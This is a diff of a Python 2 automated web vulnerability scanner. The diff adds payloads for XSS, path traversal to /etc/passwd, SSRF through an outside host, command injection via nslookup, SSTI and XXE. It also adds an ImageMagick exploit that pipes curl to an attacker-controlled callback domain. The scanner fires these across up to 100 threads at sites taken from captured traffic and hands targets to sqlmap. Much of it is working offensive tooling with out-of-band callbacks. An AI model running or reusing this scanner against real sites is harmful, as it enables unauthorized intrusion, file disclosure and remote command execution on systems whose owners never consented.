@@ -8,6 +8,7 @@ import copy
 import urlparse
 import urllib
 import json
+import base64
 import time
 import sys
 from AutoSqli import AutoSqli
@@ -26,6 +27,7 @@ v1版本，不保证稳定性，只操作GET型的XSS， payload可以自己添�
 """
 
 requests.packages.urllib3.disable_warnings()
+
 _random=str(random.randint(300,182222))
 logging.basicConfig(level=logging.INFO,
                     format='%(asctime)s ^^^: %(message)s')
@@ -34,12 +36,12 @@ lock = threading.Lock()
 # XSS规则
 XSS_Rule = {
     "script":[
-        "`';!--\"<XSS>=&{()}",
-        "&\"]}alert();{//"
-        "<svg onload=alert(1)>",
+        "\" onfous=alert(document.domain)\"><\"",
+        "\"`'></textarea><audio/onloadstart=confirm`1` src>",
+        "\"</script><svg onload=alert`1`>",
         "../../../../../../../../../../etc/passwd",
         "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
-        "..//..//..//..//..///etc/passwd",
+        "../../../../../../../../../../etc/passwd%00",
         #"././././././././././././././././././././././././../../../../../../../../etc/passwd",
         #";alert(1)//"
         #"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
@@ -47,54 +49,33 @@ XSS_Rule = {
     ],
     # URL跳转与SSRF
     "redirect" : [
-        'http://138.128.193.123/ssrf.txt', #  Valar Morghulis
+        'http://www.niufuren.cc/usr.txt', #  Valar Morghulis
+        '@www.niufuren.cc/usr.txt', #  Valar Morghulis
     ],
+
+    "cli" : [
+        "$(nslookup {domain})",
+        '&nslookup {domain}&\'\\"`0&nslookup {domain}&`\'',
+        "nslookup {domain}|nslookup {domain}&nslookup {domain}",
+        "'nslookup {domain}|nslookup {domain}&nslookup {domain}'",
+        '"nslookup {domain}|nslookup {domain}&nslookup {domain}"',
+        ";nslookup {domain}|nslookup {domain}&nslookup {domain};"
+    ],
+    'ssti' : [
+        '{{1357924680 * 2468013579}}',
+        '${1357924680 * 2468013579}'
+    ]
 }
+
+
+XXE_Role = '<?xml version="1.0" encoding="utf-8"?>\r\n<!DOCTYPE shinpachi8 [\r\n  <!ENTITY % dtd SYSTEM "http://xxe_{domain}.devil.yoyostay.top/">\r\n%dtd;]>\r\n<xxe>&shinpachi8ent;</xxe>\r\n'
+
+# imageMagick rules
+ImageMagick_Rule = 'push graphic-context\nviewbox 0 0 640 480\nimage copy 200,200 100,100 "|curl http://imagemagick_{domain}.devil.yoyostay.top"\npop graphic-context'
+
 
 # 文件包含规则
 
-"""
-# if not necessery, not use this rule, 
-XSS_Rule = {
-    "script":[
-            "<script>alert('XSS');</script>",
-            "<scr<script>ipt>alert("+_random+");</scr</script>ipt>",
-            "\"><script>alert("+_random+")</script>",
-            "<?='<SCRIPT>alert(\""+_random+"\")</SCRIPT>'?>",
-            "<scrscriptipt>alert("+_random+")</scrscriptipt>",
-            "</textarea>\'\"><script>alert(document.cookie)</script>",
-            "</div><script>alert("+_random+")</script>",
-            "'></select><script>alert("+_random+")</script>",
-    ],
-    "img":
-    [
-            "<img src=foo.png onerror=alert(/"+_random+"/) />",
-            "<IMG SRC=\"jav&#x09;ascript:alert('"+_random+"');\">",
-            "<IMG LOWSRC=\"javascript:alert('"+_random+"')\">",
-            "<IMG SRC='vbscript:msgbox(\""+_random+"\")'>",
-            ">\"><img src=\"javascript:alert('"+_random+"')\">",
-            "\"/></a></><img src=1.gif onerror=alert("+_random+")>",
-    ],
-    "iframe":
-    [
-        "\"><iframe src='javascript:alert(document.cookie)'></iframe>",
-    ],
-    "event":
-    [
-        "\" onfous=alert(document.domain)\"><\"",
-        "<SELECT NAME=\"\" onmouseover=alert("+_random+")></select>",
-    ],
-    "meta":
-    [
-        "<META HTTP-EQUIV='refresh' CONTENT='0;url=javascript:alert(/"+_random+"/');\">",
-    ],
-    "base":
-    [
-        "<BASE HREF=\"javascript:alert('"+_random+"');//\">",
-    ],
-
-}
-"""
 
 def getLinks(filename):
     # 得到url, headers->{"cookie", "Referer", "User-Agent"}
@@ -105,7 +86,7 @@ def getLinks(filename):
         content=f.read()
         blocks = content.split("\r\n\r\n\r\n\r\n")
         for index, block in enumerate(blocks):
-            
+
             tmp = block.split("\r\n")[3:-1]
             if (len(tmp) < 1):
                 continue
@@ -119,6 +100,8 @@ def getLinks(filename):
             path = ""
             host = ""
             headers = {"Cookie": "", "User-Agent": ""}
+            # print tmp
+            # continue
             for _ in tmp:
                 if _.startswith("GET") or _.startswith("POST"):
                     # 以防格式不对，多出来一个请求头
@@ -135,7 +118,7 @@ def getLinks(filename):
                     headers["Referer"] = "".join(_.split(":")[1:]).strip()
                 if _.startswith("Cookie"):
                     headers["Cookie"] = _.split(":")[1].strip()
-                
+
             # 去重，利用域名，目录， 和参数的sort值来判断，如果相同就忽略
             # 否则就加入到no_repeat里
             url = "http://" + host + path
@@ -179,35 +162,60 @@ def _init_get_url(url_group,rules,inqueue):
     for key in url_group.keys():
         # 一旦发现data,即post请求，那么就continue
         if "data" in url_group[key]:
-            continue 
-        _url_item = url_group[key]["url"]
-        headers = url_group[key]["headers"]
-        url_node = urlparse.urlparse(_url_item)
-        uquery = url_node.query
-        # 对于无参数的请求，直接将文件包含的payload放在路径后边
-        if not uquery:
-            for rule_item in rules.keys():
-            # 添加属于ssrf/URL跳转的规则, 
-                for _rule in rules[rule_item]:
-                    if 'passwd' in _rule:
-                        if not _url_item.endswith("/"):
-                            _url_item = _url_item + "/"
-                        inqueue.put({'action': _url_item + _rule, 'input': None, 'method': 'get', 'regex': _rule, 'headers': headers, 'type': 'lfi'}) 
-    
-            continue
-        url_parse = _url_item.replace('?'+uquery, '')
-        query_dict = dict(urlparse.parse_qsl(uquery))
+            _url_item = url_group[key]["url"]
+            headers = url_group[key]["headers"]
+            headers['Content-Type'] = 'application/xml'
+            # url_node = urlparse.urlparse(_url_item)
+            domain = base64.b64encode(_url_item)
+            domain = domain.rstrip("=")
+            # domain = _url_item.replace(".", "_").replace(":", "_").replace("/", "_")
+            inqueue.put({'action': _url_item, 'input': XXE_Role.replace('{domain}', domain), 'method': 'post', 'regex': None, 'headers': headers, 'type': 'xxe'})
+            
 
-        for rule_item in rules.keys():
-            for _rule in rules[rule_item]:
-                for parameter_item in query_dict.keys():
-                    tmp_dict = copy.deepcopy(query_dict)
-                    tmp_dict[parameter_item] = _rule
-                    tmp_qs = urllib.unquote(urllib.urlencode(tmp_dict)).replace('+','%20')
-                    if 'ssrf' in _rule:
-                        inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex':_rule, 'headers': headers, 'type': 'ssrf'})
-                    else:
-                        inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex':_rule, 'headers': headers, 'type': 'xss'})
+            # to use files upload, must delete the content-type key in headers
+            headers.pop('Content-Type', None)
+            inqueue.put({'action': _url_item, 'input': ImageMagick_Rule.replace('{domain}', domain),
+                'method': 'post', 'regex': None, 'headers': headers, 'type': 'imagemagick'})
+        else:
+            _url_item = url_group[key]["url"]
+            headers = url_group[key]["headers"]
+            url_node = urlparse.urlparse(_url_item)
+            uquery = url_node.query
+            # 对于无参数的请求，直接将文件包含的payload放在路径后边
+            if not uquery:
+                for rule_item in rules.keys():
+                # 添加属于ssrf/URL跳转的规则,
+                    for _rule in rules[rule_item]:
+                        if 'passwd' in _rule:
+                            if not _url_item.endswith("/"):
+                                _url_item = _url_item + "/"
+                            inqueue.put({'action': _url_item + _rule, 'input': None, 'method': 'get', 'regex': _rule, 'headers': headers, 'type': 'lfi'})
+
+                continue
+            url_parse = _url_item.replace('?'+uquery, '')
+            query_dict = dict(urlparse.parse_qsl(uquery))
+
+            for rule_item in rules.keys():
+                for _rule in rules[rule_item]:
+                    for parameter_item in query_dict.keys():
+                        tmp_dict = copy.deepcopy(query_dict)
+                        if rule_item == 'cli':
+                            # domain = url_node.netloc.replace(".", "_").replace(":", "_") + "_" + url_node.path.replace("/", "_")
+                            domain = base64.b64encode(url_node.netloc + "/" + url_node.path)
+                            # remove the last = or == in base64 encode
+                            domain = domain.rstrip('=')
+                            _rule = _rule.replace('{domain}', domain)
+
+                        tmp_dict[parameter_item] = _rule
+                        tmp_qs = urllib.unquote(urllib.urlencode(tmp_dict)).replace('+','%20')
+                        if 'usr' in _rule:
+                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex':_rule, 'headers': headers, 'type': 'usr'})
+                        elif 'nslookup' in _rule:
+                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex':_rule, 'headers': headers, 'type': 'cli'})
+                        elif "1357924680" in _rule:
+                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': '3351376549499229720',  'headers': headers, 'type': 'ssti'})
+                        else:
+                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex':_rule, 'headers': headers, 'type': 'xss'})
 
 
 
@@ -224,7 +232,14 @@ class detectXSS(threading.Thread):
             if self.inqueue.empty():
                 break
             try:
+                # if flag:
+                #     self.inqueue.get()
+                #     continue
+                logging.info(Fore.YELLOW + 'Remains: {} items>'.format(self.inqueue.qsize()) + Style.RESET_ALL)
                 target = self.inqueue.get(timeout=3)
+                if target["method"] == "post":
+                    self.request_do(target['action'], target['input'], target['regex'], target['headers'], target['type'])
+                    continue
                 if self.request_do(target['action'],None,target['regex'], target["headers"], target['type']):
                     logging.info(Fore.RED + "[*][GET] Find One Of XSS/LFI/SSRF/URL_Redirect: %s" % target['action'] + Style.RESET_ALL)
                     self.outqueue.put(target["action"])
@@ -243,7 +258,7 @@ class detectXSS(threading.Thread):
             if headers["Connection"] == "close":
                 pass
             else:
-                
+
                 headers["Connection"] = "close"
         else:
             headers["Connection"] = "close"
@@ -252,27 +267,38 @@ class detectXSS(threading.Thread):
         #logging.info("[-] Requesting " + url)
         try:
             if _data is not None:
-                req = requests.post(url,data=_data,timeout=TIMEOUT, headers=headers, verify=False)
+                if type == 'imagemagick':
+                    for name in ['imgFile', 'imgSrc', 'file', 'fileField']:
+                        files = {name : ('image.png', _data, 'image/png')}
+                        req = requests.post(url, headers=headers, files=files, verify=False)
+                        # global flag 
+                        # flag = True
+                else:
+                    req = requests.post(url,data=_data,timeout=TIMEOUT, headers=headers, verify=False)
+                return _bool
             else:
                 # 如果ssrf或者URL跳转问题，那么允许其跳转
-                if type == 'ssrf':
+                if type == 'usr':
                     req = requests.get(url,timeout=TIMEOUT, headers=headers, verify=False, allow_redirects=True)
                     req_result = "".join(req.content.split('\n'))
-                    if req_result.find('Valar Morghulis') != -1:
+                    if req_result.find('Valar Morghulis') > 0:
                         _bool=True
                         logging.info('[*] [ssrf/url redirect] FOUND!!')
                     return _bool
-                   
+
                 else:
                     req = requests.get(url,timeout=TIMEOUT, headers=headers, verify=False)
-            if ("Content-Type" in req.headers) and (req.headers["Content-Type"].split(";")[0]  in ["application/json", "text/plain", "application/javascript", "text/json", "text/javascript", "application/x-javascript"]):
+            
+            if type == 'cli':
+                return _bool
+            if (req.headers["Content-Type"].split(";")[0]  in ["application/json", "text/plain", "application/javascript", "text/json", "text/javascript", "application/x-javascript"]):
                 return _bool
             req_result = ''.join(req.content.split('\n'))
 
             if "passwd" in _regex:
-                if req_result.find('root:x:') != -1:
+                if req_result.find('root:x:') > 0:
                     _bool=True
-               
+
             elif req_result.find(_regex) != -1:
                 _bool = True
         except Exception, e:
@@ -293,12 +319,12 @@ def autoSqli(dict_result):
             data = dict_result[index]["data"]
         else:
             data = None
-        
+
         #print "-------" , data
         if "soaiymp3" in target:
             print target
         a = AutoSqli(sqlmapapi, target, data=data, cookie=cookie)
-       
+
         a.createNewTask()
         a.optionSet()
 
@@ -315,6 +341,7 @@ if __name__ == '__main__':
     outqueue = Queue()
     # 增加文件是否存在的校验
     dict_result = getLinks(filename)
+    # sys.exit(0)
     # 将action结尾的URL放入同一个URL，这样以后再出现struts漏洞时，就可以用的上了
     with open("action.lst", "a") as f:
         for i in dict_result.keys():
@@ -335,14 +362,14 @@ if __name__ == '__main__':
     time.sleep(3)
     threads = []
     # 30个线程来跑
-    for i in xrange(30):
+    for i in xrange(100):
         thd = detectXSS(inqueue, outqueue)
         #thd.setDaemon(True)
         threads.append(thd)
 
     for thd in threads:
         thd.start()
-    
+
     for thd in threads:
         if thd.is_alive():
             thd.join()
